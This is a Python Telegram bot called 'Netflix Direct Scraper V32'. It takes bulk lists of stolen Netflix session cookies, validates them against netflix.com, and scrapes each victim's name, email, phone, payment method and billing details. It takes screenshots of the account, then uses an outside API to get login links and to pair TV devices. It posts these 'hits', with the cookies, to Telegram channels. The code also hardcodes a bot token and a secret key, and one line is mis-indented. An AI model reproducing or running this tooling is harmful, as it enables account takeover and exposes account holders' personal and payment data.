import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: GREEN = ""; RED = ""; YELLOW = ""; CYAN = ""; RESET = ""
    class Style: BRIGHT = ""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(20) 

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is Running! 24/7"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

API_BASE_URL = "http://nftgenapi.onrender.com/api"
SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

def get_flag(code):
    if not code or code == "Unknown" or len(code) != 2: return ""
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def clean_text(text):
    if not text: return "Unknown"
    try: return codecs.decode(text, 'unicode_escape')
    except: return text

def extract_deep_details(html):
    details = {"plan": "Unknown", "email": "N/A", "country": "Unknown", "profiles": [], "status": "Dead", "member_since": "Unknown", "member_duration": "", "expiry": "N/A", "price": "Unknown", "payment": "Unknown", "quality": "Unknown", "name": "Unknown", "phone": "N/A", "extra_members": "No ❌"}
    
    if '"membershipStatus":"CURRENT_MEMBER"' in html: details["status"] = "Active"
    
    plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if plan_match: details["plan"] = clean_text(plan_match.group(1))

    price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if price_match: details["price"] = clean_text(price_match.group(1))
    
    pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if pm_match: details["payment"] = clean_text(pm_match.group(1))

    qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if qual_match: details["quality"] = clean_text(qual_match.group(1))

    owner_match = re.search(r'"accountOwnerName":"([^"]+)"', html)
    if owner_match: details["name"] = clean_text(owner_match.group(1))

    phone_match = re.search(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"\}', html)
    if phone_match: details["phone"] = clean_text(phone_match.group(1))

    extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true\}', html)
    if extra_match: details["extra_members"] = "Yes (Slot Available)"

    email_match = re.search(r'"email":"([^"]+)"', html)
    if email_match: details["email"] = clean_text(email_match.group(1))
    
    country_match = re.search(r'"currentCountry":"([^"]+)"', html)
    if country_match: details["country"] = country_match.group(1)
    
    since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
    if since_match:
        ts = int(since_match.group(1))
        if ts > 1e12: ts = ts / 1000
        since_date = datetime.fromtimestamp(ts)
        details["member_since"] = since_date.strftime('%Y-%m-%d')
        diff = datetime.now() - since_date
        details["member_duration"] = f"({diff.days // 365}y {(diff.days % 365) // 30}m)"

    bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if bill_match: details["expiry"] = clean_text(bill_match.group(1))

    p_names = re.findall(r'"profileName":"([^"]+)"', html)
    details["profiles"] = list(set(p_names))
    
    return details

def call_api(endpoint, payload):
    try:
        payload["secret_key"] = SECRET_KEY
        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=15)
        return resp.json()
    except: return None

def parse_smart_cookie(cookie_input):
    cookie_input = cookie_input.strip()
    if cookie_input.startswith('['):
        try:
            json_c = json.loads(cookie_input)
            for c in json_c:
                if c.get('name') == 'NetflixId': return urllib.parse.unquote(c.get('value'))
        except: pass
    match = re.search(r"NetflixId=([^;]+)", cookie_input)
    if match: return urllib.parse.unquote(match.group(1))
    if len(cookie_input) > 50: return cookie_input
    return None

def check_cookie(cookie_input):
    nid_val = parse_smart_cookie(cookie_input)
    if not nid_val: return {"valid": False}
    
    api_res = call_api("gen", {"netflix_id": nid_val})
    if not api_res or not api_res.get("success"): return {"valid": False}
    
    session = requests.Session()
    session.cookies.set("NetflixId", nid_val, domain=".netflix.com")
    try:
        acc_resp = session.get("https://www.netflix.com/YourAccount", headers=HEADERS, timeout=12)
        deep_data = extract_deep_details(acc_resp.text)
        if deep_data["email"] == "N/A": deep_data["email"] = api_res.get("email", "N/A")
        
        screenshot_bytes = None
        if SCREENSHOT_SEMAPHORE.acquire(timeout=5):
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    context = browser.new_context()
                    context.add_cookies([{'name': 'NetflixId', 'value': nid_val, 'domain': '.netflix.com', 'path': '/'}])
                    page = context.new_page()
                    page.goto("https://www.netflix.com/browse", timeout=20000, wait_until='load')
                    screenshot_bytes = page.screenshot(type='jpeg', quality=50)
                    browser.close()
            finally: SCREENSHOT_SEMAPHORE.release()
            
        return {"valid": True, "country": deep_data["country"], "magic_link": api_res.get("login_url"), "data": deep_data, "screenshot": screenshot_bytes, "full_cookie": cookie_input}
    except: return {"valid": True, "magic_link": api_res.get("login_url"), "data": {"email": api_res.get("email", "N/A"), "status": "Active"}, "screenshot": None, "full_cookie": cookie_input}

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("📩 Send Here (DM)", "📡 Send to Channel")
    kb.add("📺 TV Login", "🛑 Stop System")
    msg = ("**🔥 Netflix Direct Scraper V32**\n\n"
           "👋 **Welcome!** Here is how to use this bot:\n\n"
           "1️⃣ **Select a Mode** below.\n2️⃣ **Send Netflix Cookies** (Text/File).\n\n"
           "🍪 **Supported Format:**\n• `NetflixId=v2...` or JSON\n\n"
           "👇 **Select Mode to Begin:**")
    bot.send_message(message.chat.id, msg, reply_markup=kb, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"])
def handle_mode_selection(message):
    uid = message.chat.id
    if message.text == "📩 Send Here (DM)":
        user_modes[uid] = {'target': uid, 'stop': False}
        bot.reply_to(message, "✅ **DM Mode Active.** Now send your cookies or file.")
    elif message.text == "📡 Send to Channel":
        msg = bot.reply_to(message, "📡 **Enter Channel ID (e.g. -100xxx):**")
        bot.register_next_step_handler(msg, preview_ch)
    elif message.text == "🛑 Stop System":
        if uid in user_modes: user_modes[uid]['stop'] = True
        bot.reply_to(message, "🛑 **Scanning Stopped.**")

def preview_ch(message):
    try:
        cid = int(message.text.strip())
        chat = bot.get_chat(cid)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"setch_{cid}"))
        bot.reply_to(message, f"📡 **Channel:** {chat.title}\nConfirm?", reply_markup=markup)
    except: bot.reply_to(message, "❌ Invalid ID or Bot not Admin.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("setch_"))
def ch_callback(call):
    cid = int(call.data.split("_")[1])
    user_modes[call.message.chat.id] = {'target': cid, 'stop': False}
    bot.edit_message_text(f"✅ **Target Set!**", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.text == "📺 TV Login")
def tv_login(message):
    msg = bot.reply_to(message, "📺 **Send Netflix Cookie (Text only).**")
    bot.register_next_step_handler(msg, tv_process_cookie)

def tv_process_cookie(message):
    cookie_text = message.text.strip()
    res = check_cookie(cookie_text)
    if not res.get("valid"): return bot.reply_to(message, "❌ **Cookie Dead or Invalid!**")
    bot.reply_to(message, f"✅ **Cookie Valid!**\n📧 Email: {res['data']['email']}\n\nEnter **8-Digit TV Code**.")
    bot.register_next_step_handler(message, lambda m: tv_execute(m, parse_smart_cookie(cookie_text)))

def tv_execute(message, nid):
    tv_code = message.text.strip()
    api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": tv_code})
    bot.reply_to(message, f"📺 **Result:** {api_res.get('message', 'Error')}")

@bot.message_handler(content_types=['document', 'text'])
def handle_input(message):
    uid = message.chat.id
    if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
    
    mode = user_modes.get(uid)
    if not mode: return bot.reply_to(message, "❌ **Select a Mode first!** (Click DM or Channel button)")
    
    cookies = []
    if message.content_type == 'document':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        if message.document.file_name.endswith('.zip'):
            with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                for filename in z.namelist():
                    if filename.endswith('.txt'):
                        with z.open(filename) as f:
                            cookies.extend([l.strip() for l in f.read().decode('utf-8', errors='ignore').splitlines() if len(l.strip()) > 30])
        else:
            cookies = [l.strip() for l in downloaded_file.decode('utf-8', errors='ignore').splitlines() if len(l.strip()) > 30]
    else:
        cookies = [l.strip() for l in message.text.splitlines() if len(l.strip()) > 30]

    if not cookies: return bot.reply_to(message, "❌ **No valid cookies found!**")

    status_msg = bot.reply_to(message, "⏳ **Checking...**")
    
    def background_task():
        total = len(cookies)
        hits = []
        for i, c in enumerate(cookies, 1):
            if mode.get('stop'): break
            # Progress Bar logic
            prog = int((i/total)*10)
            bar = "■"*prog + "□"*(10-prog)
            try: bot.edit_message_text(f"🚀 **Checking:** [{bar}] {int((i/total)*100)}%\nChecked: {i}/{total}", uid, status_msg.message_id)
            except: pass
            
            res = check_cookie(c)
            if res.get("valid"):
                hits.append(res)
                send_hit(mode['target'], res, c)
        
        bot.delete_message(uid, status_msg.message_id)
        if hits:
            report = "========================================\nNETFLIX HITS REPORT\n========================================\n\n"
            for h in hits: report += f"Email: {h['data']['email']}\nPlan: {h['data'].get('plan', 'N/A')}\nLink: {h['magic_link']}\n\n" + "-"*40 + "\n"
            bot.send_document(uid, io.BytesIO(report.encode()), caption=f"✅ **Check Complete!** Found {len(hits)} Hits.")

    threading.Thread(target=background_task).start()

def send_hit(target, res, cookie):
    data = res.get("data", {})
    def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
lines = []
    lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
    lines.append("")
    lines.append(f"🟢 **STATUS:** Active ✅")
    
    # Enhancement: Veteran Badge & Expiry Countdown
    if data.get('member_since') and data['member_since'] != "Unknown":
        try:
            yrs = (datetime.now() - datetime.strptime(data['member_since'], '%Y-%m-%d')).days // 365
            if yrs >= 2: lines.append(f"🏅 **BADGE:** {yrs} Year Veteran Account")
        except: pass

    lines.append(f"🌍 **REGION:** {esc(res.get('country', 'Unknown'))} {get_flag(res.get('country', ''))}")
    if data.get('member_since') and data['member_since'] != "Unknown":
        lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(data.get('member_duration', ''))}")

    lines.append(f"👤 **OWNER:** {esc(data.get('name', 'Unknown'))}")
    plan = data.get('plan', 'Premium')
    icon = "💎" if "premium" in plan.lower() else "✅" if "standard" in plan.lower() else "📱"
    lines.append(f"{icon} **PLAN:** {esc(plan)}")
    lines.append(f"📺 **QUALITY:** {esc(data.get('quality', 'Unknown'))}")
    lines.append(f"💰 **PRICE:** {esc(data.get('price', 'Unknown'))}")
    lines.append(f"💳 **PAYMENT:** {esc(data.get('payment', 'Unknown'))}")

    if data.get('expiry') and data['expiry'] != "N/A":
        try:
            days = (datetime.strptime(data['expiry'], '%Y-%m-%d') - datetime.now()).days
            lines.append(f"📅 **NEXT BILLING:** {esc(data['expiry'])} `({max(0, days)} Days)`")
        except: lines.append(f"📅 **NEXT BILLING:** {esc(data['expiry'])}")

    if data.get('profiles'):
        lines.append(f"🎭 **PROFILES ({len(data['profiles'])}):** {', '.join([esc(p) for p in data['profiles']])}")
            
    lines.append(f"📧 **EMAIL:** {esc(data.get('email', 'N/A'))}")
    lines.append(f"☎️ **PHONE:** {esc(data.get('phone', 'N/A'))}")
    lines.append(f"👥 **EXTRA MEMBERS:** {esc(data.get('extra_members', 'No ❌'))}")
    
    lines.append("")
    lines.append(f"💜 [CLICK HERE TO LOGIN]({res['magic_link']}) 💜")
    lines.append("")
    lines.append("📋 **COOKIE (TAP TO COPY):**")
    lines.append(f"<code>{esc(cookie)}</code>")
    
    lines.append("\n━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("👨‍💻 **Admin:** [Message Me](https://t.me/F88UF) | 📢 **Channel:** [Join Here](https://t.me/F88UF9844)")
    
    msg = "\n".join(lines)
    if res.get('screenshot'):
        bot.send_photo(target, io.BytesIO(res['screenshot']), caption=msg, parse_mode='HTML')
    else: bot.send_message(target, msg, parse_mode='HTML')

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(skip_pending=True)
